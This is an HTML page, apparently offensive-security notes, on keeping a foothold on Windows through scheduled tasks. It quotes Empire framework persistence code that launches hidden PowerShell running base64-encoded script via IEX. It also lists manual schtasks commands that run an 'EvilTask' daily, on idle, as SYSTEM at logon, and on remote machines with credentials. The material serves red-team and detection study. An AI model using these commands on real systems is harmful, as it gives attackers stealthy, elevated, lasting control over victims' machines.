<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Schtasks Create A Task</title>
</head><body>Empire userland/persistence and elevated/persistence (more options)<br/>
<br/>
Persist a stager or script using schtasks<br/>
Daily trigger time or User Idle trigger<br/>
Can store the script code in an alternate data stream<br/>
<br/>
Trigger has a max data length<br/>
<br/>
triggerCmd = &quot;'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\&quot;IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String(&quot;+locationString+&quot;)))\\\&quot;'&quot;<br/>
Warning: trigger command exceeds the maximum of 259 characters<br/>
<br/>
if idleTime != '':<br/>
      script += &quot;schtasks /Create /F /SC ONIDLE /I &quot;+idleTime+&quot; /TN &quot;+taskName+&quot; /TR &quot;+triggerCmd+&quot;;&quot;<br/>
      statusMsg += &quot; with &quot;+taskName+&quot; idle trigger on &quot; + idleTime + &quot;.&quot;<br/>
<br/>
    else:<br/>
      # otherwise assume we're doing a daily trigger<br/>
      script += &quot;schtasks /Create /F /SC DAILY /ST &quot;+dailyTime+&quot; /TN &quot;+taskName+&quot; /TR &quot;+triggerCmd+&quot;;&quot;<br/>
statusMsg += &quot; with &quot;+taskName+&quot; daily trigger at &quot; + dailyTime + &quot;.&quot;<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Manually<br/>
# Runs a task daily at 8am.<br/>
schtasks /create /tn &quot;EvilTask&quot; /tr C:\Some\Evil\Task.exe /sc daily /st 08:00<br/>
<br/>
# Runs a task each time the user's session is idle for 5 minutes.<br/>
schtasks /create /tn &quot;EvilTask&quot; /tr C:\Some\Evil\Task.exe /sc onidle /i 5<br/>
<br/>
# Runs a task, as SYSTEM, each time a user logs in.<br/>
schtasks /create /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn &quot;EvilTask&quot; /tr C:\Some\Evil\Task.exe /sc onlogon<br/>
<br/>
# Runs a task on a remote machine, as SYSTEM, daily at 8am.<br/>
schtasks /create /s RemoteMachine /u domain\user /p password /ru &quot;NT AUTHORITY\SYSTEM&quot; /rp &quot;&quot; /tn<br/>
&quot;EvilTask&quot; /tr C:\Some\Evil\Task.exe /sc daily /st 08:00</body></html>